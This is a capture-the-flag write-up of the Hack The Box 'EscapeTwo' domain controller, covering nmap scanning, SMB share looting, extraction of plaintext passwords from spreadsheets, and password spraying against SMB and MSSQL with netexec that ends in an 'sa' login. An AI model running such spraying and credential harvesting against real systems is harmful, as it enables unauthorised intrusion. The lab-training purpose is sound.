---
title: EscapeTwo Hack The box |ESC4
description: And here we go again… Did you miss me? No? Fine 😤 it’s Maverick, back from the dark shadow to drop a simple and realistic write-up on the EscapeTwo machine. This box is straightforward and contains ES
pubDate: 2025-05-24
tags:
  - Security Research
  - Red Team
  - ADCS
  - ESC4
author: Mohamed Eletrepy (maverick)
readingTime: 30
coverImage: https://cdn-images-1.medium.com/max/800/1*FHpX9UCEibuKw8c9-L7Mxw.png
---

---

![](https://cdn-images-1.medium.com/max/800/1*FHpX9UCEibuKw8c9-L7Mxw.png)

![](https://cdn-images-1.medium.com/max/600/1*FGt0XQjnGVyGHj9qOogERQ.png)

### EscapeTwo Hack The box |ESC4

And here we go again… Did you miss me? No? Fine 😤 it’s Maverick, back from the dark shadow to drop a simple and realistic write-up on the EscapeTwo machine. This box is straightforward and contains ESC4 (Active Directory Certificate Services). As you know, I’ve already covered a bunch of ADCS attacks in my recent write-ups, and I’ll be collecting them all in one list soon for easy reference. I also wrote about the original Escape machine the first part of this ADCS madness. So this one? It’s round two. Ready to start digging into this one, or do you want a cert for that too? 😏

![](https://cdn-images-1.medium.com/max/800/0*ooqtFcrZR_xiFQ17.gif)

---

### 🔍 Scanning with Nmap

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# cat nmap  
# Nmap 7.95 scan initiated Sat May 24 13:35:42 2025 as: /usr/lib/nmap/nmap -sCV -Pn -oN nmap 10.10.11.51  
Nmap scan report for 10.10.11.51  
Host is up (0.16s latency).  
Not shown: 987 filtered tcp ports (no-response)  
PORT STATE SERVICE VERSION  
53/tcp open domain Simple DNS Plus  
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-05-24 17:36:05Z)  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)  
|_ssl-date: 2025-05-24T17:37:28+00:00; +3s from scanner time.  
| ssl-cert: Subject: commonName=DC01.sequel.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb  
| Not valid before: 2025-05-24T10:12:14  
|_Not valid after: 2026-05-24T10:12:14  
445/tcp open microsoft-ds?  
464/tcp open kpasswd5?  
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=DC01.sequel.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb  
| Not valid before: 2025-05-24T10:12:14  
|_Not valid after: 2026-05-24T10:12:14  
|_ssl-date: 2025-05-24T17:37:27+00:00; +2s from scanner time.  
1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM  
| ms-sql-info:  
| 10.10.11.51:1433:  
| Version:  
| name: Microsoft SQL Server 2019 RTM  
| number: 15.00.2000.00  
| Product: Microsoft SQL Server 2019  
| Service pack level: RTM  
| Post-SP patches applied: false  
|_ TCP port: 1433  
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback  
| Not valid before: 2025-05-24T02:23:08  
|_Not valid after: 2055-05-24T02:23:08  
|_ssl-date: 2025-05-24T17:37:28+00:00; +3s from scanner time.  
| ms-sql-ntlm-info:  
| 10.10.11.51:1433:  
| Target_Name: SEQUEL  
| NetBIOS_Domain_Name: SEQUEL  
| NetBIOS_Computer_Name: DC01  
| DNS_Domain_Name: sequel.htb  
| DNS_Computer_Name: DC01.sequel.htb  
| DNS_Tree_Name: sequel.htb  
|_ Product_Version: 10.0.17763  
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)  
|_ssl-date: 2025-05-24T17:37:28+00:00; +3s from scanner time.  
| ssl-cert: Subject: commonName=DC01.sequel.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb  
| Not valid before: 2025-05-24T10:12:14  
|_Not valid after: 2026-05-24T10:12:14  
3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=DC01.sequel.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb  
| Not valid before: 2025-05-24T10:12:14  
|_Not valid after: 2026-05-24T10:12:14  
|_ssl-date: 2025-05-24T17:37:27+00:00; +2s from scanner time.  
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time:  
| date: 2025-05-24T17:36:52  
|_ start_date: N/A  
| smb2-security-mode:  
| 3:1:1:  
|_ Message signing enabled and required  
|_clock-skew: mean: 2s, deviation: 0s, median: 1s  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done at Sat May 24 13:37:28 2025 -- 1 IP address (1 host up) scanned in 106.71 seconds
```

As usual, it’s a Domain Controller and it’s running `sequel.htb` on it. Common services like LDAP, SMB, DNS, and Kerberos are all chillin’ on the box, waiting to get abused. I’ll generate a proper `/etc/hosts` entry using `nxc`, then jump straight into the enumeration phase. I’m starting with SMB because that’s where the low-hanging fruit usually hides, and I’ll leave Kerberos for dessert. In my previous write-ups, I already talked a lot about how to* approach any AD machine* what to look for, what tools to use, and the general mindset. I’ll do the same here too, but this time I’ll keep it brief and straight to the point. see that

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# nxc smb 10.10.11.51 --generate-hosts-file ./hosts.txt  
SMB 10.10.11.51 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# cat hosts.txt  
10.10.11.51 DC01.sequel.htb sequel.htb DC01
```

Now let’s slap those juicy entries into `/etc/hosts` so we can stop dealing with IPs and start hacking like civilized red teamers. With that done, the enumeration journey begins map the kingdom, find the cracks, and break the crown.

---

This machine is an assumed breach scenario, which means we already have valid credentials for a user. Like I said before, having creds changes the game completely. So, let’s dig deep: start with SMB anonymous login, then test those valid creds against SMB, MSSQL, and other services. After that, it’s time to map the entire domain with BloodHound and hunt down potential attack paths. Of course, we’ll explore the MSSQL server for juicy info and, naturally, check out ADCS with the awesome Certipy. Let’s gooo!

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# nxc smb 10.10.11.51 -u '' -p ''  
SMB 10.10.11.51 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.51 445 DC01 [+] sequel.htb\:  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# nxc smb 10.10.11.51 -u rose -p "KxEPkKe6R8su"  
SMB 10.10.11.51 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.51 445 DC01 [+] sequel.htb\rose:KxEPkKe6R8su  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# nxc smb 10.10.11.51 -u rose -p "KxEPkKe6R8su" --shares  
SMB 10.10.11.51 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.51 445 DC01 [+] sequel.htb\rose:KxEPkKe6R8su  
SMB 10.10.11.51 445 DC01 [*] Enumerated shares  
SMB 10.10.11.51 445 DC01 Share Permissions Remark  
SMB 10.10.11.51 445 DC01 ----- ----------- ------  
SMB 10.10.11.51 445 DC01 Accounting Department READ  
SMB 10.10.11.51 445 DC01 ADMIN$ Remote Admin  
SMB 10.10.11.51 445 DC01 C$ Default share  
SMB 10.10.11.51 445 DC01 IPC$ READ Remote IPC  
SMB 10.10.11.51 445 DC01 NETLOGON READ Logon server share  
SMB 10.10.11.51 445 DC01 SYSVOL READ Logon server share  
SMB 10.10.11.51 445 DC01 Users READ  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# nxc mssql 10.10.11.51 -u rose -p "KxEPkKe6R8su"  
MSSQL 10.10.11.51 1433 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)  
MSSQL 10.10.11.51 1433 DC01 [+] sequel.htb\rose:KxEPkKe6R8su  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# nxc smb 10.10.11.51 -u rose -p "KxEPkKe6R8su" --users  
SMB 10.10.11.51 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.51 445 DC01 [+] sequel.htb\rose:KxEPkKe6R8su  
SMB 10.10.11.51 445 DC01 -Username- -Last PW Set- -BadPW- -Description-  
SMB 10.10.11.51 445 DC01 Administrator 2024-06-08 16:32:20 0 Built-in account for administering the computer/domain  
SMB 10.10.11.51 445 DC01 Guest 2024-12-25 14:44:53 0 Built-in account for guest access to the computer/domain  
SMB 10.10.11.51 445 DC01 krbtgt 2024-06-08 16:40:23 0 Key Distribution Center Service Account  
SMB 10.10.11.51 445 DC01 michael 2024-06-08 16:47:37 0  
SMB 10.10.11.51 445 DC01 ryan 2024-06-08 16:55:45 0  
SMB 10.10.11.51 445 DC01 oscar 2024-06-08 16:56:36 0  
SMB 10.10.11.51 445 DC01 sql_svc 2024-06-09 07:58:42 0  
SMB 10.10.11.51 445 DC01 rose 2024-12-25 14:44:54 0  
SMB 10.10.11.51 445 DC01 ca_svc 2025-05-24 19:17:29 0  
SMB 10.10.11.51 445 DC01 [*] Enumerated 9 local users: SEQUEL
```

Now we’re checking for anonymous login, enumerating users and shared files via SMB, and scouting for any MSSQL credentials. Next up, let’s take a closer look at **Accounting Department$**, since it’s not the default SMB directory and might be hiding something interesting. After that, we’ll dive into MSSQL enumeration and see what juicy info we can extract to kick off the next phase.q

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# impacket-smbclient SEQUEL.HTB/rose:KxEPkKe6R8su@dc01.sequel.htb  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies  
  
Type help for list of commands  
# shares  
Accounting Department  
ADMIN$  
C$  
IPC$  
NETLOGON  
SYSVOL  
Users  
# use Accounting Department  
#  
# ls  
drw-rw-rw- 0 Sun Jun 9 07:11:31 2024 .  
drw-rw-rw- 0 Sun Jun 9 07:11:31 2024 ..  
-rw-rw-rw- 10217 Sun Jun 9 07:11:31 2024 accounting_2024.xlsx  
-rw-rw-rw- 6780 Sun Jun 9 07:11:31 2024 accounts.xlsx  
# mget *  
[*] Downloading accounting_2024.xlsx  
[*] Downloading accounts.xlsx  
#
```

---

#### Update#1

I’ve always loved playing with tools and making sure I use the best in my arsenal. I also like checking out what each tool is really capable of. I heard a long time ago about `smbclient-ng` the enhanced version of our beloved `smbclient`. So I finally installed it again and gave it a try. I’m writing this to encourage you to give it a shot too. To install it, I used the `uv` package manager yeah, *big love* for `uv`. 💥

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/fluffy]  
└─# uv tool install git+https://github.com/p0dalirius/smbclient-ng.git  
⠦ Resolving dependencies...  
⠋ Resolving dependencies...  
⠼ Resolving dependencies...  
Updated https://github.com/p0dalirius/smbclient-ng.git (706e4ce33476210bf8d565f3c03a525cc9c297d0)  
Resolved 26 packages in 3.92s  
Built impacket==0.10.0  
Built smbclientng @ git+https://github.com/p0dalirius/smbclient-ng.git@706e4ce33476210bf8d565f3c03a525cc9c297d0  
Prepared 11 packages in 2.58s  
Installed 26 packages in 2.15s  
+ blinker==1.9.0  
+ cffi==1.17.1  
+ chardet==5.2.0  
+ charset-normalizer==3.3.2  
+ click==8.2.1  
+ commonmark==0.9.1  
+ cryptography==45.0.3  
+ dnspython==2.7.0  
+ flask==3.1.1  
+ future==1.0.0  
+ impacket==0.10.0  
+ itsdangerous==2.2.0  
+ jinja2==3.1.6  
+ ldap3==2.9.1  
+ ldapdomaindump==0.10.0  
+ markupsafe==3.0.2  
+ pefile==2023.2.7  
+ pyasn1==0.6.1  
+ pycparser==2.22  
+ pycryptodomex==3.23.0  
+ pygments==2.19.1  
+ pyopenssl==25.1.0  
+ rich==13.0.0  
+ six==1.17.0  
+ smbclientng==3.0.0 (from git+https://github.com/p0dalirius/smbclient-ng.git@706e4ce33476210bf8d565f3c03a525cc9c297d0)  
+ werkzeug==3.1.3  
Installed 2 executables: smbclientng, smbng
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# smbclientng -d "sequel.htb" -u "rose" -p "KxEPkKe6R8su" --host 10.10.11.51  
_ _ _ _  
___ _ __ ___ | |__ ___| (_) ___ _ __ | |_ _ __ __ _  
/ __| '_ ` _ \| '_ \ / __| | |/ _ \ '_ \| __|____| '_ \ / _` |  
\__ \ | | | | | |_) | (__| | | __/ | | | ||_____| | | | (_| |  
|___/_| |_| |_|_.__/ \___|_|_|\___|_| |_|\__| |_| |_|\__, |  
by @podalirius_ v3.0.0 |___/  
  
[+] Successfully authenticated to '10.10.11.51' as 'sequel.htb\rose'!  
■[\\10.10.11.51\]> shares  
┏━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━┓  
┃ Share ┃ Visibility ┃ Type ┃ Description ┃  
┡━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━┩  
│ Accounting Department │ Visible │ DISKTREE │ │  
│ ADMIN$ │ Hidden │ DISKTREE, SPECIAL │ Remote Admin │  
│ C$ │ Hidden │ DISKTREE, SPECIAL │ Default share │  
│ IPC$ │ Hidden │ IPC, SPECIAL │ Remote IPC │  
│ NETLOGON │ Visible │ DISKTREE │ Logon server share │  
│ SYSVOL │ Visible │ DISKTREE │ Logon server share │  
│ Users │ Visible │ DISKTREE │ │  
└───────────────────────┴────────────┴───────────────────┴─────────────────────┘  
■[\\10.10.11.51\]> use "Accounting Department"  
■[\\10.10.11.51\Accounting Department\]> dir  
d------- 0.00 B 2025-01-04 11:53 .\  
d------- 0.00 B 2025-01-04 11:53 ..\  
-a------ 9.98 kB 2024-06-09 06:50 accounting_2024.xlsx  
-a------ 6.62 kB 2024-06-09 06:52 accounts.xlsx  
■[\\10.10.11.51\Accounting Department\]> get *
```
---

In case you want to use legacy smbclient

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# smbclient //10.10.11.51/"Accounting Department" -U rose  
  
  
Password for [WORKGROUP\rose]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
. D 0 Sun Jun 9 06:52:21 2024  
.. D 0 Sun Jun 9 06:52:21 2024  
accounting_2024.xlsx A 10217 Sun Jun 9 06:14:49 2024  
accounts.xlsx A 6780 Sun Jun 9 06:52:07 2024  
  
6367231 blocks of size 4096. 905990 blocks available  
smb: \>
```

so we got 2 files .xlsx but can’t opening it via excel after some time chating with chatgpt he tell me that way

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# unzip accounts.xlsx -d accounts2  
Archive: accounts.xlsx  
file #1: bad zipfile offset (local header sig): 0  
inflating: accounts2/xl/workbook.xml  
inflating: accounts2/xl/theme/theme1.xml  
inflating: accounts2/xl/styles.xml  
inflating: accounts2/xl/worksheets/_rels/sheet1.xml.rels  
inflating: accounts2/xl/worksheets/sheet1.xml  
inflating: accounts2/xl/sharedStrings.xml  
inflating: accounts2/_rels/.rels  
inflating: accounts2/docProps/core.xml  
inflating: accounts2/docProps/app.xml  
inflating: accounts2/docProps/custom.xml  
inflating: accounts2/[Content_Types].xml  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# cd accounts2  
  
┌──(root㉿kali)-[/home/…/Desktop/htb/EscapeTwo/accounts2]  
└─# ls  
'[Content_Types].xml' docProps _rels xl  
  
┌──(root㉿kali)-[/home/…/Desktop/htb/EscapeTwo/accounts2]  
└─# tree  
.  
├── [Content_Types].xml  
├── docProps  
│ ├── app.xml  
│ ├── core.xml  
│ └── custom.xml  
├── _rels  
└── xl  
├── sharedStrings.xml  
├── styles.xml  
├── theme  
│ └── theme1.xml  
├── workbook.xml  
└── worksheets  
├── _rels  
│ └── sheet1.xml.rels  
└── sheet1.xml  
  
7 directories, 10 files
```

And here we go again after surfacing those files, I found creds in `SharedStrings.xml`, so I pasted them into ChatGPT and asked it to organize those creds into a neat table.

```bash
┌──(root㉿kali)-[/home/…/htb/EscapeTwo/account/xl]  
└─# cat sharedStrings.xml   
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>  
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="28" uniqueCount="27"><si><t>Date</t></si><si><t>Invoice Number</t></si><si><t>Description</t></si><si><t>Amount</t></si><si><t>Due Date</t></si><si><t>Status</t></si><si><t>Notes</t></si><si><t>1001</t></si><si><t>1002</t></si><si><t>1003</t></si><si><t>Office Supplies</t></si><si><t>Consulting</t></si><si><t>Software</t></si><si><t>01/15/2024</t></si><si><t>01/30/2024</t></si><si><t>02/05/2024</t></si><si><t>Paid</t></si><si><t>Unpaid</t></si><si><t>Follow up</t></si><si><t>23/08/2024</t></si><si><t>150$</t></si><si><t>500$</t></si><si><t>300$</t></si><si><t>Vendor</t></si><si><t>Dunder Mifflin</t></si><si><t>Business Consultancy</t></si><si><t>Windows Server License</t></si></sst> 
```

After pasting that table into my vault in Obsidian.

![](https://cdn-images-1.medium.com/max/800/1*3lGTIgnhr44H-JPMkIf3TA.png)

![](https://cdn-images-1.medium.com/max/800/1*R3_m0x-uUDC-454nl5AwuA.png)

So, what do you think? What can we do when we have creds and users? Of course, password spraying like I mentioned in my old write-ups. But hey, spraying a bunch of users in any environment is bad OPSEC, guaranteed to get you locked out fast. And if you’re a red teamer, that’s just asking for trouble. So keep that in your mind subtlety wins the game. Oh, and don’t forget to include the other users we found on SMB too.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# nxc smb 10.10.11.51 -u users -p passwords --continue-on-success  
SMB 10.10.11.51 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\angela:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\oscar:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\kevin:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\sa:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\angela:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [+] sequel.htb\oscar:86LxLBMgEWaKUnBG🫨🫨🫨  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\kevin:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\sa:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\angela:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\kevin:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\sa:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\angela:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\kevin:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\sa:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\angela: STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\kevin: STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [-] sequel.htb\sa: STATUS_LOGON_FAILURE  
SMB 10.10.11.51 445 DC01 [+] sequel.htb\:
```

And here we go we’ve got valid creds for the user Oscar. As usual, let’s check their access across our usual suspects: SMB, LDAP, MSSQL, and WinRM.

spraying also with mssql

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# nxc mssql 10.10.11.51 -u users -p passwords --continue-on-success  
MSSQL 10.10.11.51 1433 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)  
MSSQL 10.10.11.51 1433 DC01 [-] sequel.htb\angela:0fwz7Q4mSpurIt99 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] sequel.htb\oscar:0fwz7Q4mSpurIt99 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] sequel.htb\kevin:0fwz7Q4mSpurIt99 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] sequel.htb\sa:0fwz7Q4mSpurIt99 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] sequel.htb\:0fwz7Q4mSpurIt99 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] sequel.htb\angela:86LxLBMgEWaKUnBG (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [+] sequel.htb\oscar:86LxLBMgEWaKUnBG 🫨🫨🫨🫨  
MSSQL 10.10.11.51 1433 DC01 [-] sequel.htb\kevin:86LxLBMgEWaKUnBG (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] sequel.htb\sa:86LxLBMgEWaKUnBG (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] sequel.htb\:86LxLBMgEWaKUnBG (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] sequel.htb\angela:Md9Wlq1E5bZnVDVo (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] sequel.htb\kevin:Md9Wlq1E5bZnVDVo (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] sequel.htb\sa:Md9Wlq1E5bZnVDVo (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] sequel.htb\:Md9Wlq1E5bZnVDVo (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] sequel.htb\angela:MSSQLP@ssw0rd! (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] sequel.htb\kevin:MSSQLP@ssw0rd! (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] sequel.htb\sa:MSSQLP@ssw0rd! (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] sequel.htb\:MSSQLP@ssw0rd! (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] sequel.htb\angela: (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] sequel.htb\kevin: (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] sequel.htb\sa: (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] sequel.htb\: (Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'. Please try again with or without '--local-auth')  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/EscapeTwo]  
└─# nxc mssql 10.10.11.51 -u users -p passwords --continue-on-success --local-auth  
MSSQL 10.10.11.51 1433 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)  
MSSQL 10.10.11.51 1433 DC01 [-] DC01\angela:0fwz7Q4mSpurIt99 (Login failed for user 'angela'. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] DC01\oscar:0fwz7Q4mSpurIt99 (Login failed for user 'oscar'. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] DC01\kevin:0fwz7Q4mSpurIt99 (Login failed for user 'kevin'. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] DC01\sa:0fwz7Q4mSpurIt99 (Login failed for user 'sa'. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] DC01\:0fwz7Q4mSpurIt99 (Login failed for user ''. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] DC01\angela:86LxLBMgEWaKUnBG (Login failed for user 'angela'. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] DC01\oscar:86LxLBMgEWaKUnBG (Login failed for user 'oscar'. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] DC01\kevin:86LxLBMgEWaKUnBG (Login failed for user 'kevin'. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] DC01\sa:86LxLBMgEWaKUnBG (Login failed for user 'sa'. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] DC01\:86LxLBMgEWaKUnBG (Login failed for user ''. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] DC01\angela:Md9Wlq1E5bZnVDVo (Login failed for user 'angela'. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] DC01\oscar:Md9Wlq1E5bZnVDVo (Login failed for user 'oscar'. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] DC01\kevin:Md9Wlq1E5bZnVDVo (Login failed for user 'kevin'. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] DC01\sa:Md9Wlq1E5bZnVDVo (Login failed for user 'sa'. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] DC01\:Md9Wlq1E5bZnVDVo (Login failed for user ''. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] DC01\angela:MSSQLP@ssw0rd! (Login failed for user 'angela'. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] DC01\oscar:MSSQLP@ssw0rd! (Login failed for user 'oscar'. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] DC01\kevin:MSSQLP@ssw0rd! (Login failed for user 'kevin'. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)🫨🫨🫨🫨🫨🫨🫨🫨  
MSSQL 10.10.11.51 1433 DC01 [-] DC01\:MSSQLP@ssw0rd! (Login failed for user ''. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] DC01\angela: (Login failed for user 'angela'. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] DC01\oscar: (Login failed for user 'oscar'. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] DC01\kevin: (Login failed for user 'kevin'. Please try again with or without '--local-auth')  
MSSQL 10.10.11.51 1433 DC01 [-] DC01\: (Login failed for user ''. Please try again with or without '--local-auth')
```

